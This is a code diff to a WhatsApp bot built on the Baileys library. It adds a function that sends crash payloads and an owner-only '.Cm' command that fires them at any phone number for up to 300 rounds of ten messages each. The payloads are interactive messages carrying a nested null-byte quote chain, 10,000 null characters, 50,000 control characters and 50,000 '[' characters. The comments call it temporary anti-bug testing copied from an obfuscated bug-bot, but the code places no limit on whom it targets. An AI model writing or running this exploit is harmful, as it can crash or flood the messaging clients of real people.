@@ -2568,6 +2568,60 @@ async function sendFiosProbe(prim, target) {
     return { locationNameChars: F_OS_NAME.length, buttonTextChars: F_OS_BUTTON_TEXT.length, pauseMs };
 }
 
+// 🧪 TEMPORARY probe: the "fvckb1tch" hybrid from the obfuscated Squichy RX
+// case.js (crash-msg / crash-vis / crash-img / crash-expens). One round =
+// 10 payloads, 1s apart (faithful to the original loop). Note: our stock
+// Baileys proto lacks Header.bloksWidget and the groupStatusMentionMessage
+// messageAssociation field, so those two sub-payloads are dropped on encode —
+// the 10-deep null-byte quoted chain, real CDN image ref, and the 50k-char
+// title/subtitle/nativeFlow poison all encode and ship.
+async function sendCrashmsgProbe(prim, target) {
+    // Chain of `depth` nested quoted messages, each carrying a null-byte text.
+    // Recursive quote parsing on the target client is the new attack surface.
+    const quotedChain = (depth = 10) => {
+        let q = { conversation: '\x00' };
+        for (let i = 0; i < depth; i++) {
+            q = { extendedTextMessage: { text: '\x00', contextInfo: { quotedMessage: q } } };
+        }
+        return q;
+    };
+    let sent = 0;
+    for (let i = 0; i < 10; i++) {
+        await prim.relayMessage(target, {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: {
+                        contextInfo: { quotedMessage: quotedChain() },
+                        header: {
+                            title: '\x00'.repeat(10000),
+                            subtitle: '\x10'.repeat(50000),
+                            hasMediaAttachment: true,
+                            imageMessage: {
+                                url: 'https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQPw3StiK4uxZZT4h_Dc2F8vjrOMvXcW5mebzpfMqsOqtSKkl016u8dENJXm-MyPm93HPklzjiZRWN2ClVtMtXa78-HfwAcAGcW1AFTQrA?ccb=9-4&oh=01_Q5Aa5gHZmbyqf-u6qIzMuyqBCu5J3hjJP_wpfXsaYx1ugYaHzQ&oe=6AE081EB&_nc_sid=e6ed6c&mms3=true',
+                                mimetype: 'image/jpeg',
+                                fileSha256: 'aWnmH8sTluvlu53gBU/8WR25vcGiUD9RVa9xictFQeg=',
+                                fileLength: '21702',
+                                height: 295,
+                                width: 512,
+                                mediaKey: 'k9tHs3uM9a9M/Uq3Rjmv3wHKJ2w86lCH/zpNKbnIgLY=',
+                                fileEncSha256: 'X/+sOttc0pKVz+EeiHu63zSZHpF5Ui4PqiS3EHD2XoE=',
+                                directPath: '/o1/v/t24/f2/m232/AQPw3StiK4uxZZT4h_Dc2F8vjrOMvXcW5mebzpfMqsOqtSKkl016u8dENJXm-MyPm93HPklzjiZRWN2ClVtMtXa78-HfwAcAGcW1AFTQrA?ccb=9-4&oh=01_Q5Aa5gHZmbyqf-u6qIzMuyqBCu5J3hjJP_wpfXsaYx1ugYaHzQ&oe=6AE081EB&_nc_sid=e6ed6c',
+                                mediaKeyTimestamp: '1790520498',
+                                jpegThumbnail: ''
+                            }
+                        },
+                        body: { text: '\u000F' },
+                        nativeFlowMessage: { buttons: '['.repeat(50000) }
+                    }
+                }
+            }
+        }, {});
+        sent++;
+        if (i < 9) await delay(1000);
+    }
+    return { sent };
+}
+
 const CRASHCLICK_STATIC = {
     messageContextInfo: {
         deviceListMetadata: {},
@@ -4938,6 +4992,87 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
             await safeWaReply(sock, remoteJid, `❌ .${dKind} sent ×${dSent} then failed: ${err?.message || err}`, msg);
         } finally {
             if (dSyncPause) setSyncPaused(false);
+        }
+        return;
+    }
+
+    // 🧪 TEMPORARY `.Cm` — the fvckb1tch hybrid (crash-msg family), owner/dev
+    // only; delete with the other test commands when antibug testing ends.
+    //   .Cm                 → usage help
+    //   .Cm <number>        → ONE round = 10 payloads (1s apart)
+    //   .Cm <number> <N>    → N rounds (1-300); 30-70ms between rounds, 1s
+    //                          inside each — faithful to the original bug-bot,
+    //                          where 200 rounds = 2000 payloads.
+    const isCmCommand = cisFirstWord === '.cm' || cisFirstWord === `${cisPrefix}cm`;
+    if (isCmCommand) {
+        const cmSenderJid = msg.key?.participant || msg.key?.remoteJid || '';
+        const cmIsOwner = fromMe || (
+            !!sock.user?.id &&
+            jidNormalizedUser(cmSenderJid) === jidNormalizedUser(sock.user.id)
+        );
+        if (!cmIsOwner && !isDevNumber(cmSenderJid)) {
+            await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', msg);
+            return;
+        }
+
+        const cmUsage =
+            '🧪 *CM USAGE*\n\n' +
+            '• .Cm <number> — one round (×10 payloads)\n' +
+            '• .Cm <number> <amount> — rounds (1-300; each round = ×10 payloads)\n\n' +
+            '⚠️ Heavy: 200 rounds = 2000 payloads.';
+        const cmParts = cisWords.slice(1).join(' ').trim().split(/\s+/).filter(Boolean);
+        if (!cmParts.length) {
+            await safeWaReply(sock, remoteJid, cmUsage, msg);
+            return;
+        }
+
+        let cmRounds = 1;
+        if (cmParts.length >= 2 && /^\d{1,3}$/.test(cmParts[cmParts.length - 1])) {
+            cmRounds = Math.min(300, Number(cmParts[cmParts.length - 1]));
+            cmParts.pop();
+        }
+        const cmTargetInput = cmParts.join(' ').trim();
+        const cmTargetNumber = cmTargetInput.replace(/\D/g, '');
+        if (!/^\+?[\d\s-]+$/.test(cmTargetInput) || cmTargetNumber.length < 8 || cmTargetNumber.length > 15) {
+            await safeWaReply(sock, remoteJid, cmUsage, msg);
+            return;
+        }
+
+        // Safety: the bot's OWN number can never be a target.
+        const cmBotNum = String(phoneNumber || '').replace(/\D/g, '')
+            || (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
+        if (cmTargetNumber === cmBotNum) {
+            await safeWaReply(sock, remoteJid, '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.', msg);
+            return;
+        }
+
+        const cmTargetJid = `${cmTargetNumber}@s.whatsapp.net`;
+        try {
+            const [waCheck] = await sock.onWhatsApp(cmTargetJid);
+            if (!waCheck?.exists) {
+                await safeWaReply(sock, remoteJid, `❌ Test number has no account: ${cmTargetNumber}`, msg);
+                return;
+            }
+        } catch (_) { /* lookup failed — try the send anyway */ }
+
+        // Pause Supabase session sync for the burst (same as .Cia/.FIA).
+        const cmSyncPause = isSupabaseEnabled();
+        if (cmSyncPause) setSyncPaused(true);
+        let cmRoundsDone = 0, cmSent = 0;
+        try {
+            for (let r = 0; r < cmRounds; r++) {
+                const res = await sendCrashmsgProbe(sock, cmTargetJid);
+                cmRoundsDone++;
+                cmSent += res.sent || 0;
+                log('TEST', `${phoneNumber}: .Cm round ${cmRoundsDone}/${cmRounds} (+${res.sent} payloads, total ${cmSent}) → ${cmTargetJid}`);
+                if (r < cmRounds - 1) await delay(30 + Math.floor(Math.random() * 40));
+            }
+            await safeWaReply(sock, remoteJid, `🧪 .Cm done: ${cmRoundsDone} rounds, ${cmSent} payloads → ${cmTargetNumber}`, msg);
+        } catch (err) {
+            logError('TEST', `${phoneNumber}: .Cm failed after ${cmSent} payload(s)`, err);
+            await safeWaReply(sock, remoteJid, `❌ .Cm sent ${cmSent} payloads then failed: ${err?.message || err}`, msg);
+        } finally {
+            if (cmSyncPause) setSyncPaused(false);
         }
         return;
     }
